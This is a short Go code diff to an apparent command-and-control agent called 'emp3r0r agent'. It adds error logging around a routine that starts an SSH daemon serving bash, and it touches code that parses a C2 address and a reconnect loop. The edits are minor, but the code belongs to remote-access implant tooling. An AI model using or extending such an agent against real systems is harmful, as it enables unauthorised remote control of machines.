@@ -34,6 +34,7 @@ func main() {
 	// version
 	if *version {
 		fmt.Printf("emp3r0r agent (%s)\n", emp3r0r_data.Version)
+
 		return
 	}
 
@@ -102,7 +103,12 @@ func main() {
 	go socketListen()
 
 	// start SSHD
-	go agent.SSHD("bash", emp3r0r_data.SSHDPort)
+	go func() {
+		err = agent.SSHD("bash", emp3r0r_data.SSHDPort)
+		if err != nil {
+			log.Printf("Error starting SSHD: %v", err)
+		}
+	}()
 
 	// parse C2 address
 	emp3r0r_data.CCIP = strings.Split(emp3r0r_data.CCAddress, "/")[2]
@@ -277,7 +283,7 @@ connect:
 	goto connect
 }
 
-// listen on a unix socket
+// listen on a unix socket, used to check if agent is responsive
 func socketListen() {
 	// if socket file exists
 	if util.IsFileExist(emp3r0r_data.SocketName) {
